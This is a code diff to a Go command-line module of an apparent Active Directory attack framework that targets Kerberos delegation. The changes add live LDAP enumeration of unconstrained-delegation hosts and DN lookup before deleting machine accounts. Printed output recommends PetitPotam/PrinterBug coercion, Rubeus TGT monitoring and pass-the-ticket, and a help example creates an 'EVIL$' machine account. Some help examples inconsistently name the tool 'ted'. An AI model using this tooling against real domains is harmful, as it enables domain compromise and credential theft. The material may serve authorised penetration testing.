@@ -8,11 +8,12 @@ import (
 
 	"github.com/loudmumble/trusted/pkg/delegation"
 	"github.com/loudmumble/trusted/pkg/pki"
+	"github.com/loudmumble/trusted/pkg/util"
 	"github.com/spf13/cobra"
 )
 
 var delegationCmd = &cobra.Command{
-	Use:   "delegation",
+	Use:   "deleg",
 	Short: "Delegation attacks — constrained, unconstrained, RBCD",
 	Long: `Active Directory delegation attack framework.
 
@@ -27,10 +28,10 @@ Subcommands:
   remove       Remove constrained delegation attribute
 
 Examples:
-  trusted delegation enum --target-dc dc01 --domain corp.local -u user -p pass
-  trusted delegation constrained --spn cifs/file01 --user admin
-  trusted delegation rbcd --target COMPUTER$
-  trusted delegation create --target EVIL$ --pass P@ssw0rd123!`,
+  trusted deleg enum -d corp.local -dc dc01
+  ted deleg constrained --spn cifs/file01 --user admin
+  ted deleg rbcd --target COMPUTER$
+  ted deleg create --target EVIL$ --pass P@ssw0rd123!`,
 }
 
 var delegationEnumCmd = &cobra.Command{
@@ -187,24 +188,49 @@ var delegationUnconCmd = &cobra.Command{
 	Use:   "uncon",
 	Short: "Detect unconstrained delegation",
 	RunE: func(cmd *cobra.Command, args []string) error {
-		target, _ := cmd.Flags().GetString("target")
-		if target == "" {
-			return fmt.Errorf("--target is required")
-		}
-
 		cfg := buildDelegationConfig(cmd)
 		if err := pki.ValidateConnectionConfig(cfg); err != nil {
 			return err
 		}
+		ctx := context.Background()
 
-		fmt.Printf("[*] Unconstrained Delegation on %s\n", target)
-		fmt.Printf("    Domain: %s\n", cfg.Domain)
-		fmt.Printf("    User: %s\n", cfg.Username)
-		fmt.Println("\n[!] Unconstrained delegation allows any service to impersonate any user.")
-		fmt.Println("[*] Attack vectors:")
-		fmt.Println("    1. Monitor for TGTs: Rubeus.exe monitor /interval:5")
-		fmt.Println("    2. Use TGTs for pass-the-ticket")
-		fmt.Println("    3. Coerce auth via PetitPotam/PrinterBug")
+		conn, err := delegation.ConnectLDAP(ctx, cfg)
+		if err != nil {
+			return fmt.Errorf("LDAP connect: %w", err)
+		}
+		defer conn.Close()
+
+		result, err := delegation.EnumerateDelegation(ctx, cfg, conn)
+		if err != nil {
+			return fmt.Errorf("enumerate delegation: %w", err)
+		}
+
+		var unconTargets []delegation.DelegationTarget
+		for _, t := range result.Targets {
+			if t.Type == delegation.DelegationUnconstrained {
+				unconTargets = append(unconTargets, t)
+			}
+		}
+
+		if len(unconTargets) == 0 {
+			fmt.Println("[+] No unconstrained delegation targets found")
+			return nil
+		}
+
+		fmt.Printf("\n[!] Found %d unconstrained delegation target(s):\n\n", len(unconTargets))
+		for i, t := range unconTargets {
+			fmt.Printf("  %d. %s\n", i+1, t.Name)
+			fmt.Printf("     DN: %s\n", t.DN)
+			if t.IsComputer {
+				fmt.Println("     Type: Computer")
+			}
+			fmt.Println()
+		}
+
+		fmt.Println("[*] Attack vectors for unconstrained delegation:")
+		fmt.Println("    1. Coerce auth via PetitPotam/PrinterBug to capture TGT")
+		fmt.Println("    2. Monitor for TGTs: Rubeus.exe monitor /interval:5 /targetuser:krbtgt")
+		fmt.Println("    3. Use captured TGTs for pass-the-ticket")
 		return nil
 	},
 }
@@ -272,14 +298,18 @@ var delegationDeleteCmd = &cobra.Command{
 		defer conn.Close()
 
 		machineName := strings.TrimSuffix(target, "$")
-		dn := fmt.Sprintf("CN=%s,CN=Computers,%s", machineName, buildDomainDNFromDomain(cfg.Domain))
+		baseDN := buildDomainDNFromDomain(cfg.Domain)
+		dn, err := delegation.FindComputerDN(conn, baseDN, target)
+		if err != nil {
+			return fmt.Errorf("find computer: %w", err)
+		}
 		fmt.Printf("[*] Deleting machine account: %s\n", dn)
 
 		if err := delegation.DeleteMachineAccount(conn, dn); err != nil {
 			return fmt.Errorf("delete machine account: %w", err)
 		}
 
-		fmt.Printf("[+] Machine account deleted\n")
+		fmt.Printf("[+] Machine account deleted (%s)\n", machineName)
 		return nil
 	},
 }
@@ -351,7 +381,7 @@ var delegationRemoveCmd = &cobra.Command{
 }
 
 func buildDelegationConfig(cmd *cobra.Command) *pki.ADCSConfig {
-	targetDC, _ := cmd.Flags().GetString("target-dc")
+	targetDC, _ := cmd.Flags().GetString("dc")
 	domain, _ := cmd.Flags().GetString("domain")
 	username, _ := cmd.Flags().GetString("username")
 	password, _ := cmd.Flags().GetString("password")
@@ -383,12 +413,7 @@ func buildDelegationConfig(cmd *cobra.Command) *pki.ADCSConfig {
 }
 
 func buildDomainDNFromDomain(domain string) string {
-	parts := strings.Split(domain, ".")
-	var dcParts []string
-	for _, p := range parts {
-		dcParts = append(dcParts, "DC="+p)
-	}
-	return strings.Join(dcParts, ",")
+	return util.BuildDomainDN(domain)
 }
 
 func init() {
@@ -402,15 +427,6 @@ func init() {
 	delegationCmd.AddCommand(delegationDeleteCmd)
 	delegationCmd.AddCommand(delegationSetCmd)
 	delegationCmd.AddCommand(delegationRemoveCmd)
-
-	addConnectionFlags(delegationEnumCmd)
-	addConnectionFlags(delegationConstrainedCmd)
-	addConnectionFlags(delegationRBCDCmd)
-	addConnectionFlags(delegationUnconCmd)
-	addConnectionFlags(delegationCreateCmd)
-	addConnectionFlags(delegationDeleteCmd)
-	addConnectionFlags(delegationSetCmd)
-	addConnectionFlags(delegationRemoveCmd)
 
 	delegationConstrainedCmd.Flags().String("spn", "", "Target SPN")
 	delegationConstrainedCmd.Flags().String("user", "", "Target user to impersonate")
@@ -430,21 +446,4 @@ func init() {
 
 	delegationRemoveCmd.Flags().String("target", "", "Target")
 	delegationRemoveCmd.Flags().String("spn", "", "Target SPN")
-}
-
-func addConnectionFlags(cmd *cobra.Command) {
-	cmd.Flags().String("target-dc", "", "Target DC")
-	cmd.Flags().StringP("domain", "d", "", "Domain")
-	cmd.Flags().StringP("username", "u", "", "Username")
-	cmd.Flags().StringP("password", "p", "", "Password")
-	cmd.Flags().String("hash", "", "NTLM hash")
-	cmd.Flags().BoolP("kerberos", "k", false, "Kerberos auth")
-	cmd.Flags().String("ccache", "", "Ccache file")
-	cmd.Flags().String("keytab", "", "Keytab file")
-	cmd.Flags().String("dc-ip", "", "KDC IP")
-	cmd.Flags().Bool("ldaps", false, "Use LDAPS")
-	cmd.Flags().Bool("start-tls", false, "Use StartTLS")
-	cmd.Flags().Bool("stealth", false, "Stealth mode")
-	cmd.Flags().Int("timeout", 10, "Timeout (seconds)")
-	cmd.Flags().Bool("json", false, "JSON output")
 }
